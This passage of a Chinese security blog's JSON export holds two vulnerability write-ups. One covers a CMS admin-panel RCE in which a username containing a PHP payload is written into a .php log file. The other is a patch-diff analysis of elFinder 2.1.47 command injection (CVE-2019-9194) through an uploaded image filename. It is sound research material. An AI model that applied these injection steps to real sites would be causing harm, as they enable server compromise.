/*”的这条数据中flag字段设置为”4”，见下图\n\n![57a266774442cac19e1940f78a19be59.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162744-9867b278-2302-1.png)\n\n这样一来，当访问\n\n<http://127.0.0.1/admin/integrate.php?act=sync>\n\n时，该数据将会被取出，含有payload的用户名将会被写入日志文件中\n\n![ed203b9ab0d60983b3d416c61895714d.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162751-9ca610be-2302-1.png)\n\n![a87d9a0b26820ed3f67e5344a693c9f0.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162817-ac3dea1a-2302-1.png)\n\n文件被访问时，payload执行\n\n![d2a929fbdeef3fa6abb0ec4db4d46af1.png](https://xzfile.aliyuncs.com/media/upload/picture/20191220162828-b2ec022a-2302-1.png)","slug":"ecshop","published":1,"updated":"2020-10-28T01:05:07.245Z","_id":"ckgrozu9a0036wsa98efkbcwf","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在审计某CMS代码时，发现后台存在一处比较有意思的远程代码执行漏洞，这里跟大家分享下</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>漏洞触发点位于下图代码段中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162647-768caf50-2302-1.png\" alt=\"18198d7bef3600f760c2119c30c64ecc.png\"></p>\n<p>见上图803行处，存在一处fwrite方法：</p>\n<p>程序会将修改日志$log变量中的值保存到’/integrate_’ . $_SESSION[‘code’] .’_log.php’文件中</p>\n<p>接下来看一下$log变量是如何拼接的：</p>\n<p>$log变量是由如下一个或多个变量控制:$del_list、$rename_list以及$ignore_list</p>\n<p>当这个三个变量存在时，则将其值拼接到$log变量中</p>\n<p>这里着重看一下$ignore_list变量，分析代码可以发现，$ignore_list变量由下述代码中赋值得来</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162655-7ba47e28-2302-1.png\" alt=\"7683d7c5d4d1ca08b5e70174a93087fc.png\"></p>\n<p>由上图代码可见$ignore_list变量由数据库中users表user_name数据组成。其实$ignore_list就是users表中flag等于4的所有user_name字段组成的列表</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162703-804630b6-2302-1.png\" alt=\"1b91284972c1113a79c2bf1fd70956e0.png\"></p>\n<p>见上图，当请求中act参数值为sync时，并且当users表中存在flag=4的行时，触发此处$ignore_list赋值操作，将users表中flag等于4的所有行的user_name字段值插入$ignore_list列表</p>\n<p>当$ignore_list列表非空时，触发同样在此if分支(请求中act参数值为sync的这个分支)中的漏洞点</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162714-86f223fc-2302-1.png\" alt=\"0f0f4dc686ff9a92c9ba427a796015d6.png\"></p>\n<p>上图红框处，$ignore_list列表中的用户名被取出，用来拼接$log变量，随后$log变量被写入’/integrate_’. $_SESSION[‘code’] . ‘_log.php’文件中</p>\n<p>程序并未对会员用户名进行严格过滤，导致可以写入含有payload的用户名，例如</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162724-8cce1ea2-2302-1.png\" alt=\"15d30f7d208c53a7ca582868cd4f5a9f.png\"></p>\n<p>当我们将含有恶意payload用户名的用户flag设置为4时，通过访问</p>\n<p><a href=\"http://127.0.0.1/admin/integrate.php?act=sync\">http://127.0.0.1/admin/integrate.php?act=sync</a></p>\n<p>即可将含有payload用户名写入’/integrate_’ . $_SESSION[‘code’] . ‘_log.php’文件中</p>\n<p>接下来分析下被插入payload文件的位置与名字</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162735-936c3988-2302-1.png\" alt=\"f05035aa16c4c659585e1e1a4602a72c.png\"></p>\n<p>可见上图，这个文件位置很好定位，位于ROOT_PATH . DATA_DIR路径，即为data文件夹中。</p>\n<p>关于文件名，中间存在一个$_SESSION[‘code’]变量，此处变量是可以设置的，但是如果我们不进行特殊设置的化，这个变量默认是空，因此我们并不需要额外的设置这个变量，默认让它为空就可以了，这样以来被插入后门的文件就变成</p>\n<p>data/integrate__log.php</p>\n<p>接下来分析下，如何使users中我们构造的恶意用户flag为4</p>\n<p>默认情况下，会员用户flag为0，当会员整合功能被使用时，其他应用商城的会员被整合合并到这个cms时，当存在一些问题需要忽略这个用户时，flag才会被设置为4</p>\n<p>如果使用这种方法，则需要攻击者自行搭建一个此cms允许合并数据的商城程序，在这个商城程序中构造一个会员，当使用会员合并功能时，使之出现问题，从而使得被合并的会员flag为4</p>\n<p>利用会员整合功能修改flag值是一种途径，然而有一种更简便的方法。此cms程序后台存在可以管理数据库的功能，我们可以通过这个功能直接把用户名为”&lt;?php phpinfo(); /*”的这条数据中flag字段设置为”4”，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162744-9867b278-2302-1.png\" alt=\"57a266774442cac19e1940f78a19be59.png\"></p>\n<p>这样一来，当访问</p>\n<p><a href=\"http://127.0.0.1/admin/integrate.php?act=sync\">http://127.0.0.1/admin/integrate.php?act=sync</a></p>\n<p>时，该数据将会被取出，含有payload的用户名将会被写入日志文件中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162751-9ca610be-2302-1.png\" alt=\"ed203b9ab0d60983b3d416c61895714d.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162817-ac3dea1a-2302-1.png\" alt=\"a87d9a0b26820ed3f67e5344a693c9f0.png\"></p>\n<p>文件被访问时，payload执行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162828-b2ec022a-2302-1.png\" alt=\"d2a929fbdeef3fa6abb0ec4db4d46af1.png\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>在审计某CMS代码时，发现后台存在一处比较有意思的远程代码执行漏洞，这里跟大家分享下</p>","more":"<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>漏洞触发点位于下图代码段中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162647-768caf50-2302-1.png\" alt=\"18198d7bef3600f760c2119c30c64ecc.png\"></p>\n<p>见上图803行处，存在一处fwrite方法：</p>\n<p>程序会将修改日志$log变量中的值保存到’/integrate_’ . $_SESSION[‘code’] .’_log.php’文件中</p>\n<p>接下来看一下$log变量是如何拼接的：</p>\n<p>$log变量是由如下一个或多个变量控制:$del_list、$rename_list以及$ignore_list</p>\n<p>当这个三个变量存在时，则将其值拼接到$log变量中</p>\n<p>这里着重看一下$ignore_list变量，分析代码可以发现，$ignore_list变量由下述代码中赋值得来</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162655-7ba47e28-2302-1.png\" alt=\"7683d7c5d4d1ca08b5e70174a93087fc.png\"></p>\n<p>由上图代码可见$ignore_list变量由数据库中users表user_name数据组成。其实$ignore_list就是users表中flag等于4的所有user_name字段组成的列表</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162703-804630b6-2302-1.png\" alt=\"1b91284972c1113a79c2bf1fd70956e0.png\"></p>\n<p>见上图，当请求中act参数值为sync时，并且当users表中存在flag=4的行时，触发此处$ignore_list赋值操作，将users表中flag等于4的所有行的user_name字段值插入$ignore_list列表</p>\n<p>当$ignore_list列表非空时，触发同样在此if分支(请求中act参数值为sync的这个分支)中的漏洞点</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162714-86f223fc-2302-1.png\" alt=\"0f0f4dc686ff9a92c9ba427a796015d6.png\"></p>\n<p>上图红框处，$ignore_list列表中的用户名被取出，用来拼接$log变量，随后$log变量被写入’/integrate_’. $_SESSION[‘code’] . ‘_log.php’文件中</p>\n<p>程序并未对会员用户名进行严格过滤，导致可以写入含有payload的用户名，例如</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162724-8cce1ea2-2302-1.png\" alt=\"15d30f7d208c53a7ca582868cd4f5a9f.png\"></p>\n<p>当我们将含有恶意payload用户名的用户flag设置为4时，通过访问</p>\n<p><a href=\"http://127.0.0.1/admin/integrate.php?act=sync\">http://127.0.0.1/admin/integrate.php?act=sync</a></p>\n<p>即可将含有payload用户名写入’/integrate_’ . $_SESSION[‘code’] . ‘_log.php’文件中</p>\n<p>接下来分析下被插入payload文件的位置与名字</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162735-936c3988-2302-1.png\" alt=\"f05035aa16c4c659585e1e1a4602a72c.png\"></p>\n<p>可见上图，这个文件位置很好定位，位于ROOT_PATH . DATA_DIR路径，即为data文件夹中。</p>\n<p>关于文件名，中间存在一个$_SESSION[‘code’]变量，此处变量是可以设置的，但是如果我们不进行特殊设置的化，这个变量默认是空，因此我们并不需要额外的设置这个变量，默认让它为空就可以了，这样以来被插入后门的文件就变成</p>\n<p>data/integrate__log.php</p>\n<p>接下来分析下，如何使users中我们构造的恶意用户flag为4</p>\n<p>默认情况下，会员用户flag为0，当会员整合功能被使用时，其他应用商城的会员被整合合并到这个cms时，当存在一些问题需要忽略这个用户时，flag才会被设置为4</p>\n<p>如果使用这种方法，则需要攻击者自行搭建一个此cms允许合并数据的商城程序，在这个商城程序中构造一个会员，当使用会员合并功能时，使之出现问题，从而使得被合并的会员flag为4</p>\n<p>利用会员整合功能修改flag值是一种途径，然而有一种更简便的方法。此cms程序后台存在可以管理数据库的功能，我们可以通过这个功能直接把用户名为”&lt;?php phpinfo(); /*”的这条数据中flag字段设置为”4”，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162744-9867b278-2302-1.png\" alt=\"57a266774442cac19e1940f78a19be59.png\"></p>\n<p>这样一来，当访问</p>\n<p><a href=\"http://127.0.0.1/admin/integrate.php?act=sync\">http://127.0.0.1/admin/integrate.php?act=sync</a></p>\n<p>时，该数据将会被取出，含有payload的用户名将会被写入日志文件中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162751-9ca610be-2302-1.png\" alt=\"ed203b9ab0d60983b3d416c61895714d.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162817-ac3dea1a-2302-1.png\" alt=\"a87d9a0b26820ed3f67e5344a693c9f0.png\"></p>\n<p>文件被访问时，payload执行</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191220162828-b2ec022a-2302-1.png\" alt=\"d2a929fbdeef3fa6abb0ec4db4d46af1.png\"></p>"},{"title":"空安全意识，撸码一时手抖 elFinder-2.1.47代码执行漏洞-CVE-2019-9194详解","date":"2019-03-22T06:17:21.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nCVE-2019-9194，这是一个很神奇的漏洞。\n开发者在漏洞的上一行，用了过滤方法对传入的参数进行过滤，然而到了下一行，却手一抖，直接用传入的未过滤的参数拼接cmd，进行执行，造成了远程代码执行漏洞\n\n<!--more-->\n\n## 漏洞分析\nelFinder是一个用于Web的开源文件管理器，使用jQuery UI以JavaScript编写。创作的灵感来自于Mac OS X操作系统中使用的Finder程序的简单性和便利性。\n\n相关的漏洞说明可以见如下packet storm的链接：\nhttps://packetstormsecurity.com/files/151960/elFinder-2.1.47-Command-Injection.html\n\nelFinder这个项目可以在github上找到，该项目的star数为3195，可见此次漏洞影响范围还是不小的。\n\n本次漏洞是在2.1.48版本修复的，官方在readme中强调需要升级最新的版本以修复该漏洞。\n![1.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315164505-a1b0bc52-46fe-1.png)\n\n现在来看一下2.1.48中是如何修复的，以便于我们找到这个漏洞的触发点。\n\n不得不吐槽，这个项目的版本控制很奇怪。。。\n按照以往经验，既然在下一个版本修复的，那我们就应该在下一个版本的release commits中寻找修复方案\n![2.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315164545-b9793f1c-46fe-1.png)\n但是这7个commits里并没有关于漏洞的修复，至少看起来都不像是修复漏洞用的。\n\n仔细研究里下他的提交记录后，发现这个项目是在2.1这个版本上进行修改，然后release 不同的版本（2.1.47/2.1.48/）\n其实从2.1.48release的记录上来看，7 commits to 2.1 since this release 就可以看出来了，48版本并不是在47版本上修改得来的，所以看48的release没有用。\n这里应该看2.1.47的\n![3.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315164611-c89165f6-46fe-1.png)\n由于改动都是在2.1上进行的，因此比较2.1与2.1.47之间的commits就可以找到47漏洞所在了。\n\n漏洞位于php/elFinderVolumeDriver.class.php中的imgRotate方法中\n![4.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315164639-d9b04faa-46fe-1.png)\n从这里的修复来看，漏洞触发点一定是位于这里。\n\n可以看见修复有两点：\n其一：使用$quotedPath替换原来的$path参数，这个$quotedPath一直存在，可见开发者还是有安全意识的，但是在写代码时候估计是写错了。\n其二：用 “--”来来结束后面的参数选项  \n\n\n![5.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315164955-4e81a590-46ff-1.png)\n这里可以参见命令行解析器中，“--”的意思，“-- 表示选项结束并禁用进一步的选项处理。 -- 之后的任何参数都被视为文件名和参数。”\n\n也就是说，可以有效的防止了传入参数选项而绕过escapeshellarg，可以参见gitlist 0.6.0远程命令执行漏洞。\n通过分析补丁，我们已经摸清触发点所在，并且了解是如何修复的，下面来看下漏洞是如何利用的。\n\n首先跟一下存在漏洞的函数 imgRotate，看看被哪个方法调用\n\n位于\\php\\elFinderVolumeDriver.class.php中的resize方法中调用imgRotate方法\n\n![7.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165038-67c1d7aa-46ff-1.png)\n可见这里的$work_path被传入imgRotate中\n\n而在imgRotate中，此$path 参数被直接拼到$cmds[]中，如下图：\n![8.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165055-7244dcc2-46ff-1.png)\n拼接后的$cmds[]接着被遍历传入proExec中执行\n\nproExec代码如下\n![9.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165112-7c086f26-46ff-1.png)\n\n也就是说，如果这个$work_path可控，那么就会导致代码执行。\n\n看一下漏洞利用poc\n\n首先，上传一个图片，图片名为构造好的poc\n\n![10.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165202-9a147032-46ff-1.png)\n\n通过返回的json，可以知道该图片的hash值\n\n用该hash值构造请求，以剪裁改图片\n\n![11.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165233-ac528932-46ff-1.png)\n在检测图片过程中，由于path为我们构造的恶意数据，导致代码执行。\n\n运行一下packetstorm上给出的poc\n\n![12.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165247-b4d04eb4-46ff-1.png)\n直接跳到resize部分\n\n![13.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165301-bcd7c312-46ff-1.png)\n这里的$path值是由上传的图片的hash解码出来的，可见我们构造的数据被包含在其中。\n\n接着，$path值传递给$work_path\n\n![14.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165318-c708b1ac-46ff-1.png)\n\n接着$work_path传入imgRotate中\n![15.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165334-d0b4e5ae-46ff-1.png)\n\n接着，我们构造的参数被拼接到$cmds[]中\n![16.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165352-db43f320-46ff-1.png)\n\n最后，拼接完成的指令被传入procExec中的proc_open方法\n\n![17.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165411-e6ccc762-46ff-1.png)\n\n构造好的代码最终被执行\n![18.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165437-f648993c-46ff-1.png)\n\n## 写在后面\n这个漏洞如果想成功利用，目标服务器上需装有exiftran,否则无法复现该漏洞","source":"_posts/elFinder-2-1-47.md","raw":"---\ntitle: 空安全意识，撸码一时手抖 elFinder-2.1.47代码执行漏洞-CVE-2019-9194详解\ndate: 2019-03-22 14:17:21\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nCVE-2019-9194，这是一个很神奇的漏洞。\n开发者在漏洞的上一行，用了过滤方法对传入的参数进行过滤，然而到了下一行，却手一抖，直接用传入的未过滤的参数拼接cmd，进行执行，造成了远程代码执行漏洞\n\n<!--more-->\n\n## 漏洞分析\nelFinder是一个用于Web的开源文件管理器，使用jQuery UI以JavaScript编写。创作的灵感来自于Mac OS X操作系统中使用的Finder程序的简单性和便利性。\n\n相关的漏洞说明可以见如下packet storm的链接：\nhttps://packetstormsecurity.com/files/151960/elFinder-2.1.47-Command-Injection.html\n\nelFinder这个项目可以在github上找到，该项目的star数为3195，可见此次漏洞影响范围还是不小的。\n\n本次漏洞是在2.1.48版本修复的，官方在readme中强调需要升级最新的版本以修复该漏洞。\n![1.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315164505-a1b0bc52-46fe-1.png)\n\n现在来看一下2.1.48中是如何修复的，以便于我们找到这个漏洞的触发点。\n\n不得不吐槽，这个项目的版本控制很奇怪。。。\n按照以往经验，既然在下一个版本修复的，那我们就应该在下一个版本的release commits中寻找修复方案\n![2.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315164545-b9793f1c-46fe-1.png)\n但是这7个commits里并没有关于漏洞的修复，至少看起来都不像是修复漏洞用的。\n\n仔细研究里下他的提交记录后，发现这个项目是在2.1这个版本上进行修改，然后release 不同的版本（2.1.47/2.1.48/）\n其实从2.1.48release的记录上来看，7 commits to 2.1 since this release 就可以看出来了，48版本并不是在47版本上修改得来的，所以看48的release没有用。\n这里应该看2.1.47的\n![3.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315164611-c89165f6-46fe-1.png)\n由于改动都是在2.1上进行的，因此比较2.1与2.1.47之间的commits就可以找到47漏洞所在了。\n\n漏洞位于php/elFinderVolumeDriver.class.php中的imgRotate方法中\n![4.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315164639-d9b04faa-46fe-1.png)\n从这里的修复来看，漏洞触发点一定是位于这里。\n\n可以看见修复有两点：\n其一：使用$quotedPath替换原来的$path参数，这个$quotedPath一直存在，可见开发者还是有安全意识的，但是在写代码时候估计是写错了。\n其二：用 “--”来来结束后面的参数选项  \n\n\n![5.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315164955-4e81a590-46ff-1.png)\n这里可以参见命令行解析器中，“--”的意思，“-- 表示选项结束并禁用进一步的选项处理。 -- 之后的任何参数都被视为文件名和参数。”\n\n也就是说，可以有效的防止了传入参数选项而绕过escapeshellarg，可以参见gitlist 0.6.0远程命令执行漏洞。\n通过分析补丁，我们已经摸清触发点所在，并且了解是如何修复的，下面来看下漏洞是如何利用的。\n\n首先跟一下存在漏洞的函数 imgRotate，看看被哪个方法调用\n\n位于\\php\\elFinderVolumeDriver.class.php中的resize方法中调用imgRotate方法\n\n![7.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165038-67c1d7aa-46ff-1.png)\n可见这里的$work_path被传入imgRotate中\n\n而在imgRotate中，此$path 参数被直接拼到$cmds[]中，如下图：\n![8.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165055-7244dcc2-46ff-1.png)\n拼接后的$cmds[]接着被遍历传入proExec中执行\n\nproExec代码如下\n![9.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165112-7c086f26-46ff-1.png)\n\n也就是说，如果这个$work_path可控，那么就会导致代码执行。\n\n看一下漏洞利用poc\n\n首先，上传一个图片，图片名为构造好的poc\n\n![10.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165202-9a147032-46ff-1.png)\n\n通过返回的json，可以知道该图片的hash值\n\n用该hash值构造请求，以剪裁改图片\n\n![11.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165233-ac528932-46ff-1.png)\n在检测图片过程中，由于path为我们构造的恶意数据，导致代码执行。\n\n运行一下packetstorm上给出的poc\n\n![12.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165247-b4d04eb4-46ff-1.png)\n直接跳到resize部分\n\n![13.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165301-bcd7c312-46ff-1.png)\n这里的$path值是由上传的图片的hash解码出来的，可见我们构造的数据被包含在其中。\n\n接着，$path值传递给$work_path\n\n![14.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165318-c708b1ac-46ff-1.png)\n\n接着$work_path传入imgRotate中\n![15.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165334-d0b4e5ae-46ff-1.png)\n\n接着，我们构造的参数被拼接到$cmds[]中\n![16.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165352-db43f320-46ff-1.png)\n\n最后，拼接完成的指令被传入procExec中的proc_open方法\n\n![17.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165411-e6ccc762-46ff-1.png)\n\n构造好的代码最终被执行\n![18.png](https://xzfile.aliyuncs.com/media/upload/picture/20190315165437-f648993c-46ff-1.png)\n\n## 写在后面\n这个漏洞如果想成功利用，目标服务器上需装有exiftran,否则无法复现该漏洞","slug":"elFinder-2-1-47","published":1,"updated":"2020-10-27T09:27:09.540Z","_id":"ckgrozu9b0039wsa9cuhr6jen","comments":1,"layout":"post","photos":[],"link":"","content":"<p>CVE-2019-9194，这是一个很神奇的漏洞。<br>开发者在漏洞的上一行，用了过滤方法对传入的参数进行过滤，然而到了下一行，却手一抖，直接用传入的未过滤的参数拼接cmd，进行执行，造成了远程代码执行漏洞</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>elFinder是一个用于Web的开源文件管理器，使用jQuery UI以JavaScript编写。创作的灵感来自于Mac OS X操作系统中使用的Finder程序的简单性和便利性。</p>\n<p>相关的漏洞说明可以见如下packet storm的链接：<br><a href=\"https://packetstormsecurity.com/files/151960/elFinder-2.1.47-Command-Injection.html\">https://packetstormsecurity.com/files/151960/elFinder-2.1.47-Command-Injection.html</a></p>\n<p>elFinder这个项目可以在github上找到，该项目的star数为3195，可见此次漏洞影响范围还是不小的。</p>\n<p>本次漏洞是在2.1.48版本修复的，官方在readme中强调需要升级最新的版本以修复该漏洞。<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315164505-a1b0bc52-46fe-1.png\" alt=\"1.png\"></p>\n<p>现在来看一下2.1.48中是如何修复的，以便于我们找到这个漏洞的触发点。</p>\n<p>不得不吐槽，这个项目的版本控制很奇怪。。。<br>按照以往经验，既然在下一个版本修复的，那我们就应该在下一个版本的release commits中寻找修复方案<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315164545-b9793f1c-46fe-1.png\" alt=\"2.png\"><br>但是这7个commits里并没有关于漏洞的修复，至少看起来都不像是修复漏洞用的。</p>\n<p>仔细研究里下他的提交记录后，发现这个项目是在2.1这个版本上进行修改，然后release 不同的版本（2.1.47/2.1.48/）<br>其实从2.1.48release的记录上来看，7 commits to 2.1 since this release 就可以看出来了，48版本并不是在47版本上修改得来的，所以看48的release没有用。<br>这里应该看2.1.47的<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315164611-c89165f6-46fe-1.png\" alt=\"3.png\"><br>由于改动都是在2.1上进行的，因此比较2.1与2.1.47之间的commits就可以找到47漏洞所在了。</p>\n<p>漏洞位于php/elFinderVolumeDriver.class.php中的imgRotate方法中<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315164639-d9b04faa-46fe-1.png\" alt=\"4.png\"><br>从这里的修复来看，漏洞触发点一定是位于这里。</p>\n<p>可以看见修复有两点：<br>其一：使用$quotedPath替换原来的$path参数，这个$quotedPath一直存在，可见开发者还是有安全意识的，但是在写代码时候估计是写错了。<br>其二：用 “–”来来结束后面的参数选项  </p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315164955-4e81a590-46ff-1.png\" alt=\"5.png\"><br>这里可以参见命令行解析器中，“–”的意思，“– 表示选项结束并禁用进一步的选项处理。 – 之后的任何参数都被视为文件名和参数。”</p>\n<p>也就是说，可以有效的防止了传入参数选项而绕过escapeshellarg，可以参见gitlist 0.6.0远程命令执行漏洞。<br>通过分析补丁，我们已经摸清触发点所在，并且了解是如何修复的，下面来看下漏洞是如何利用的。</p>\n<p>首先跟一下存在漏洞的函数 imgRotate，看看被哪个方法调用</p>\n<p>位于\\php\\elFinderVolumeDriver.class.php中的resize方法中调用imgRotate方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165038-67c1d7aa-46ff-1.png\" alt=\"7.png\"><br>可见这里的$work_path被传入imgRotate中</p>\n<p>而在imgRotate中，此$path 参数被直接拼到$cmds[]中，如下图：<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165055-7244dcc2-46ff-1.png\" alt=\"8.png\"><br>拼接后的$cmds[]接着被遍历传入proExec中执行</p>\n<p>proExec代码如下<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165112-7c086f26-46ff-1.png\" alt=\"9.png\"></p>\n<p>也就是说，如果这个$work_path可控，那么就会导致代码执行。</p>\n<p>看一下漏洞利用poc</p>\n<p>首先，上传一个图片，图片名为构造好的poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165202-9a147032-46ff-1.png\" alt=\"10.png\"></p>\n<p>通过返回的json，可以知道该图片的hash值</p>\n<p>用该hash值构造请求，以剪裁改图片</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165233-ac528932-46ff-1.png\" alt=\"11.png\"><br>在检测图片过程中，由于path为我们构造的恶意数据，导致代码执行。</p>\n<p>运行一下packetstorm上给出的poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165247-b4d04eb4-46ff-1.png\" alt=\"12.png\"><br>直接跳到resize部分</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165301-bcd7c312-46ff-1.png\" alt=\"13.png\"><br>这里的$path值是由上传的图片的hash解码出来的，可见我们构造的数据被包含在其中。</p>\n<p>接着，$path值传递给$work_path</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165318-c708b1ac-46ff-1.png\" alt=\"14.png\"></p>\n<p>接着$work_path传入imgRotate中<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165334-d0b4e5ae-46ff-1.png\" alt=\"15.png\"></p>\n<p>接着，我们构造的参数被拼接到$cmds[]中<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165352-db43f320-46ff-1.png\" alt=\"16.png\"></p>\n<p>最后，拼接完成的指令被传入procExec中的proc_open方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165411-e6ccc762-46ff-1.png\" alt=\"17.png\"></p>\n<p>构造好的代码最终被执行<br><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190315165437-f648993c-46ff-1.png\" alt=\"18.png\"></p>\n<h2 id=\"写在后面\"><a href=\"#写在后面\" class=\"headerlink\" 